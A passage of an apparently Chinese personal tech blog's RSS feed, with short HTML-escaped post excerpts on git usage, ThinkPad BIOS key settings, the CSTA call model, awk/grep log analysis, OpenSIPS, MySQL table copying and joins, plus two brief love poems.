          &lt;td&gt;&lt;code&gt;git checkout round-2&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;多次&lt;/td&gt;
          &lt;td&gt;// 切换到round-2分支&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;git branch --set-upstream-to=origin/round-2&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;每个分支只需要执行一次&lt;/td&gt;
          &lt;td&gt;// 将本地round-2分支关联远程round-2分支&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;git add -A&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;每次增加文件都要执行&lt;/td&gt;
          &lt;td&gt;// 在round-2下创建了一个文件, 使用-A可以添加所有文件到暂存区&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;git commit -am &amp;quot;我增加了一个文件&amp;quot;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;每次提交都要执行&lt;/td&gt;
          &lt;td&gt;// commit&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;git push&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;每次推送都要执行&lt;/td&gt;
          &lt;td&gt;//最好是在push之前，使用git pull拉去远程代码到本地，否则有可能被拒绝&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;git pull&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;每次拉去都要执行&lt;/td&gt;
          &lt;td&gt;拉去远程分支代码到本地并合并到当前分支&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;2-常用的git命令&#34;&gt;2. 常用的git命令&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;假设你在master分支上&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 将本地修改后的文件推送到本地仓库
git commit -am &amp;#39;修改了一个问题&amp;#39;

// 将本地仓库推送到远程仓库
git push
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;21-状态管理&#34;&gt;2.1. 状态管理&lt;/h2&gt;
&lt;h3 id=&#34;211-状态查看&#34;&gt;2.1.1. 状态查看&lt;/h3&gt;
&lt;p&gt;查看当前仓库状态&lt;/p&gt;</description>
    </item>
    <item>
      <title>免费服务的盈利模式</title>
      <link>https://wdd.js.org/posts/2019/10/ce03id/</link>
      <pubDate>Tue, 15 Oct 2019 21:46:04 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/ce03id/</guid>
      <description>&lt;p&gt;免费产品的盈利模式有四种&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;投放广告&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;增值服务：先把羊养肥，再慢慢割羊毛，现在大部分都是互联网服务都是这种&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;交叉补贴: A服务免费，再用户使用A服务时，通过提供B服务来盈利&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;零边际成本：免费提供A服务，但是用户需要用物品去交换A服务，服务提供者通过加工物品来盈利&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>thinkpad 系列恢复F1-F12原始功能，切换ctrl和fn的位置</title>
      <link>https://wdd.js.org/posts/2019/10/qzbgvf/</link>
      <pubDate>Tue, 15 Oct 2019 21:45:31 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/qzbgvf/</guid>
      <description>&lt;h1 id=&#34;1-实验准备&#34;&gt;1. 实验准备&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;T450笔记本&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-进入bios&#34;&gt;2. 进入BIOS&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;重启电脑&lt;/li&gt;
&lt;li&gt;一直不停按enter&lt;/li&gt;
&lt;li&gt;按F1&lt;/li&gt;
&lt;li&gt;选择Keyboard/mouse&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;3-恢复f1-f2恢复原始功能&#34;&gt;3. 恢复F1-F2恢复原始功能:&lt;/h1&gt;
&lt;p&gt;fn and ctrl key swap &lt;strong&gt;[enabled]&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;4-切换ctrl和ctrl的位置&#34;&gt;4. 切换ctrl和ctrl的位置:&lt;/h1&gt;
&lt;p&gt;F1-F12 as primary function &lt;strong&gt;[enabled]&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;5-保存退出&#34;&gt;5. 保存，退出&lt;/h1&gt;</description>
    </item>
    <item>
      <title>CSTA 呼叫模型简介</title>
      <link>https://wdd.js.org/opensips/ch1/csta-call-model/</link>
      <pubDate>Tue, 15 Oct 2019 21:43:41 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch1/csta-call-model/</guid>
      <description>&lt;h1 id=&#34;1-内容概要&#34;&gt;1. 内容概要&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;CSTA 协议与标准概述&lt;/li&gt;
&lt;li&gt;CSTA OpenScape 语音架构概述&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-csta-协议标准&#34;&gt;2. CSTA 协议标准&lt;/h1&gt;
&lt;h2 id=&#34;21-什么是-csta-&#34;&gt;2.1. 什么是 CSTA ?&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CSTA：电脑支持通讯程序(Computer Supported TelecommunicationsApplications)&lt;/li&gt;
&lt;li&gt;基本的呼叫模型在 1992 建立，后来随着行业发展，呼叫模型也被加强和扩展，例如新的协议等等&lt;/li&gt;
&lt;li&gt;CSTA 是一个应用层接口，用来监控呼叫，设备和网络&lt;/li&gt;
&lt;li&gt;CSTA 创建了一个通讯程序的抽象层:
&lt;ul&gt;
&lt;li&gt;CSTA 并不依赖任何底层的信令协议
&lt;ul&gt;
&lt;li&gt;E.g.H.323,SIP,Analog,T1,ISDN,etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSTA 并不要求用户必须使用某些设备
&lt;ul&gt;
&lt;li&gt;E.g.intelligentendpoints,low-function/stimulusdevices,SIPSignalingmodels-3PCC vs. Peer/Peer&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;适用不同的操作模式
&lt;ul&gt;
&lt;li&gt;第三方呼叫控制&lt;/li&gt;
&lt;li&gt;一方呼叫控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CSTA 的设计目标是为了提高各种 CSTA 实现之间的移植性
&lt;ul&gt;
&lt;li&gt;规范化呼叫模型和行为&lt;/li&gt;
&lt;li&gt;完成服务、事件定义&lt;/li&gt;
&lt;li&gt;规范化标准&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-csta-标准的进化史&#34;&gt;3. CSTA 标准的进化史&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;阶段 1 (发布于 June ’92)
&lt;ul&gt;
&lt;li&gt;40 特性, 66 页 (服务定义)&lt;/li&gt;
&lt;li&gt;专注于呼叫控制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;阶段 2 (发布于 Dec. ’94)
&lt;ul&gt;
&lt;li&gt;77 特性, 145 页 (服务定义)&lt;/li&gt;
&lt;li&gt;I/O &amp;amp; 语音单元服务, 更多呼叫控制服务&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;阶段 3 - CSTA Phase II Features &amp;amp; versit CTI Technology
&lt;ul&gt;
&lt;li&gt;发布于 Dec. ‘98&lt;/li&gt;
&lt;li&gt;136 特性, 650 页 (服务定义)&lt;/li&gt;
&lt;li&gt;作为 ISO 标准发布于 July 2000&lt;/li&gt;
&lt;li&gt;发布 CSTA XML (ECMA-323) June 2004&lt;/li&gt;
&lt;li&gt;发布 “Using CSTA with Voice Browsers” (TR/85) Dec. 02&lt;/li&gt;
&lt;li&gt;发布 CSTA WSDL (ECMA-348) June 2004&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;June 2004: 发布对象模型 TR/88&lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;June 2004: 发布 “Using CSTA for SIP Phone User Agents (uaCSTA)” TR/87&lt;/li&gt;
&lt;li&gt;June 2004: 发布 “Application Session Services” (ECMA-354)&lt;/li&gt;
&lt;li&gt;June 2005: 发布 “WS-Session: WSDL for ECMA-354”(ECMA-366)&lt;/li&gt;
&lt;li&gt;December 2005 : 发布 “Management Notification and Computing Function&lt;!-- raw HTML omitted --&gt;Services”&lt;/li&gt;
&lt;li&gt;December 2005 : Session Management, Event Notification, Amendements for ECMA-&lt;!-- raw HTML omitted --&gt;348” (TR/90)&lt;/li&gt;
&lt;li&gt;December 2006 : Published new editions of ECMA-269, ECMA-323, ECMA-348&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;4-csta-标准文档&#34;&gt;4. CSTA 标准文档&lt;/h1&gt;
&lt;p&gt;&lt;a href=&#34;https://wdd.js.org/img/images/20180129213747_HP5lYR_Jietu20180129-213719.jpeg&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn.nlark.com/yuque/0/2019/jpeg/280451/1571147034063-0db35ed4-139b-4f24-b590-d4b3a550e83b.jpeg#align=left&amp;display=inline&amp;height=762&amp;originHeight=762&amp;originWidth=968&amp;size=0&amp;status=done&amp;width=968&#34;&gt;&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>awk、grep、cut、sort、uniq简单命令玩转日志分析与统计</title>
      <link>https://wdd.js.org/shell/grep-awk-sort/</link>
      <pubDate>Tue, 15 Oct 2019 21:35:15 +0800</pubDate>
      <guid>https://wdd.js.org/shell/grep-awk-sort/</guid>
      <description>&lt;p&gt;test.log&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
2019-1010-1920 192.345.23.1 cause:&amp;#34;BBB&amp;#34; type:&amp;#34;A&amp;#34; loginIn
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
2019-1010-1920 192.345.23.1 cause:&amp;#34;BBJ&amp;#34; type:&amp;#34;A&amp;#34; loginIn
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;按列分割&#34;&gt;按列分割&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;提取第三列&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;日志列数比较少或则要提取的字段比较靠前时，优先使用 awk。当然 cut 也可以做到。&lt;/p&gt;
&lt;p&gt;比如输出日志的第三列&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;awk &amp;#39;{print $3}&amp;#39; test.log // $3表示第三列
cut -d &amp;#34; &amp;#34; -f3 test.log // -f3指定第三列, -d用来指定分割符
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;正则提取&#34;&gt;正则提取&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;提取 cause 字段的原因值？&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;A&amp;#34; loginIn
2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; loginIn cause:&amp;#34;BBB&amp;#34;
2019-1010-1920 192.345.23.3 cause:&amp;#34;AAA&amp;#34; type:&amp;#34;S&amp;#34; loginIn
2019-1010-1920 192.345.23.1 type:&amp;#34;A&amp;#34; cause:&amp;#34;BBJ&amp;#34; loginIn
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;当要提取的内容不在同一列时，往往就无法用cut或者awk就按列提取&lt;/code&gt;。最好用的方式是用 grep 的正则提取。&lt;/p&gt;
&lt;p&gt;好像 grep 不支持捕获分组，所以只能提取出出 cause:&amp;ldquo;AAA&amp;rdquo;，而无法直接提取出 AAA&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows上免费的文本对比工具</title>
      <link>https://wdd.js.org/posts/2019/10/zo8dx2/</link>
      <pubDate>Tue, 15 Oct 2019 11:24:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/zo8dx2/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://winmerge.org/?lang=en&#34;&gt;https://winmerge.org/?lang=en&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/zo8dx2/2022-10-29-19-58-33.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.yuque.com/attachments/yuque/0/2019/zip/280451/1571109955442-52856f01-dd3f-4a0b-8df1-64ce063b68d4.zip?_lake_card=%7B%22uid%22%3A%221571109951803-0%22%2C%22src%22%3A%22https%3A%2F%2Fwww.yuque.com%2Fattachments%2Fyuque%2F0%2F2019%2Fzip%2F280451%2F1571109955442-52856f01-dd3f-4a0b-8df1-64ce063b68d4.zip%22%2C%22name%22%3A%22WinMerge-2.16.4-Setup.exe.zip%22%2C%22size%22%3A5704664%2C%22type%22%3A%22application%2Fzip%22%2C%22ext%22%3A%22zip%22%2C%22progress%22%3A%7B%22percent%22%3A0%7D%2C%22status%22%3A%22done%22%2C%22percent%22%3A0%2C%22id%22%3A%224hUeH%22%2C%22card%22%3A%22file%22%7D&#34;&gt;WinMerge-2.16.4-Setup.exe.zip&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>ERROR:carrierroute:carrier_tree_fixup: default_carrier not found</title>
      <link>https://wdd.js.org/opensips/ch7/without-default-carrier/</link>
      <pubDate>Sat, 12 Oct 2019 12:17:27 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch7/without-default-carrier/</guid>
      <description>&lt;p&gt;route_tree表中需要增加carrier&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;id&lt;/th&gt;
          &lt;th&gt;carrier&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;default&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>手工安装git最新版</title>
      <link>https://wdd.js.org/posts/2019/10/gxkb91/</link>
      <pubDate>Sat, 12 Oct 2019 11:25:20 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/gxkb91/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt; Install Required Packages&lt;!-- raw HTML omitted --&gt;Firstly we need to make sure that we have installed required packages on your system. Use following command to install required packages before compiling Git source.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel
# yum install  gcc perl-ExtUtils-MakeMaker
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; Uninstall old Git RPM&lt;!-- raw HTML omitted --&gt;Now remove any prior installation of Git through RPM file or Yum package manager. If your older version is also compiled through source, then skip this step.&lt;/p&gt;</description>
    </item>
    <item>
      <title>如何面对未知的项目</title>
      <link>https://wdd.js.org/posts/2019/10/bl933p/</link>
      <pubDate>Fri, 11 Oct 2019 19:20:26 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/bl933p/</guid>
      <description>&lt;p&gt;有些项目，文档写的不是很清楚，很多地方都需要摸着石头过河，在此写下自己的一点心得体会。&lt;/p&gt;
&lt;h1 id=&#34;后悔药&#34;&gt;后悔药&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;哪怕是改动一行代码，也要创建一个新的分支&lt;/strong&gt;。如果发现前方有无法绕行的故障，你将会庆幸自己给自己留下退路。&lt;/p&gt;
&lt;p&gt;不要把自己逼到死角，永远给自己留下一个B计划。&lt;/p&gt;
&lt;h1 id=&#34;小碎步&#34;&gt;小碎步&lt;/h1&gt;
&lt;p&gt;&lt;strong&gt;不要大段重构，要小步慢走&lt;/strong&gt;。尽量减少发生问题的点。在一本书中找错别字很难，但是在一行文字中找错别字就非常容易了。&lt;/p&gt;
&lt;h1 id=&#34;勿猜测&#34;&gt;勿猜测&lt;/h1&gt;
&lt;p&gt;当你不知道某个函数如何使用时，&lt;strong&gt;不要去猜测&lt;/strong&gt;，而应该去看官方文档是如何讲解这个函数的。&lt;/p&gt;
&lt;h1 id=&#34;heading&#34;&gt;&lt;/h1&gt;</description>
    </item>
    <item>
      <title>一个人喝粥太淡</title>
      <link>https://wdd.js.org/posts/2019/10/an4am1/</link>
      <pubDate>Fri, 11 Oct 2019 19:18:21 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/an4am1/</guid>
      <description>&lt;p&gt;一个人喝粥太淡，&lt;!-- raw HTML omitted --&gt;两个人电话粥太甜。&lt;!-- raw HTML omitted --&gt;回忆似水流年，&lt;!-- raw HTML omitted --&gt;翘首如花美眷。&lt;!-- raw HTML omitted --&gt;对着微信聊天，&lt;!-- raw HTML omitted --&gt;凌晨了也没有觉得晚。&lt;!-- raw HTML omitted --&gt;窗外的月亮很圆，&lt;!-- raw HTML omitted --&gt;就像你那双明亮的眼。&lt;!-- raw HTML omitted --&gt;说一声晚安，&lt;!-- raw HTML omitted --&gt;道一声再见，&lt;!-- raw HTML omitted --&gt;我的梦中是有你的春天。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/an4am1/2022-10-29-19-38-42.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>你有邮箱吗？</title>
      <link>https://wdd.js.org/posts/2019/10/tgn9th/</link>
      <pubDate>Fri, 11 Oct 2019 19:15:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/tgn9th/</guid>
      <description>&lt;p&gt;你有邮箱吗？&lt;!-- raw HTML omitted --&gt;如果你有的话，&lt;!-- raw HTML omitted --&gt;那么当我不在你身边的时候，&lt;!-- raw HTML omitted --&gt;我会每天给你写一封信，&lt;!-- raw HTML omitted --&gt;告诉你，&lt;!-- raw HTML omitted --&gt;我今天遇见的的人，&lt;!-- raw HTML omitted --&gt;告诉你，&lt;!-- raw HTML omitted --&gt;我身边发生的事，&lt;!-- raw HTML omitted --&gt;告诉你，&lt;!-- raw HTML omitted --&gt;当你不在我身边时，&lt;!-- raw HTML omitted --&gt;我有多想你&lt;/p&gt;</description>
    </item>
    <item>
      <title>MySql表复制 与 调整字段</title>
      <link>https://wdd.js.org/posts/2019/10/nhrhfr/</link>
      <pubDate>Thu, 10 Oct 2019 21:30:20 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/nhrhfr/</guid>
      <description>&lt;h1 id=&#34;表复制&#34;&gt;表复制&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 不跨数据库&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;insert into subscriber_copy(id, username) select id, username &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; subscriber
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 跨数据库 需要在表名前加上数据库名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;insert into wdd&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;test(id, username) select id, username &lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; opensips.subscriber
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;调整表结构&#34;&gt;调整表结构&lt;/h1&gt;
&lt;h2 id=&#34;增加字段&#34;&gt;增加字段&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ALTER TABLE test ADD &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt;username&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;`&lt;/span&gt; char(&lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; null default &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>理解mysql 表连接</title>
      <link>https://wdd.js.org/posts/2019/10/gdeknt/</link>
      <pubDate>Thu, 10 Oct 2019 21:29:32 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/10/gdeknt/</guid>
      <description>&lt;p&gt;表wdd_a&lt;!-- raw HTML omitted --&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/gdeknt/2022-10-29-19-49-42.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;表wdd_b&lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/gdeknt/2022-10-29-19-50-01.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;不使用where子句生成的表的数是两个表行数的积，其字段的字段两个表的拼接&lt;/p&gt;
&lt;p&gt;查询的行数 = 表a的行数 x 表b的行数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;wdd_a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;join&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;wdd_b&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;order&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;by&lt;/span&gt; wdd_a.id
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2019/10/gdeknt/2022-10-29-19-50-09.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;表联合不使用where子句，会存在两个问题&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;查询出来的结果没有意义&lt;/li&gt;
&lt;li&gt;产生大量的无用数据，例如1000行的表a联合1000行的表b，将会产生1000*1000行的结果&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;wdd_a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;join&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;wdd_b&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;where&lt;/span&gt; wdd_a.id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; wdd_b.id
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当使用表联合之后，产生的数据&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;是有意义的&lt;/li&gt;
&lt;li&gt;查询结果的行数一定比两张表的行数都要少&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;下面是一个复杂的例子，给表起了别名，另外也只抽取了部分字段&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;SELECT&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;id&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;caller_id_dpid&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;caller_id_dpid&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;callee_id_dpid&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;callee_id_dpid&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;.&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;trunk_group&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;AS&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;trunk_group&lt;span style=&#34;color:#f92672&#34;&gt;`&lt;/span&gt;,
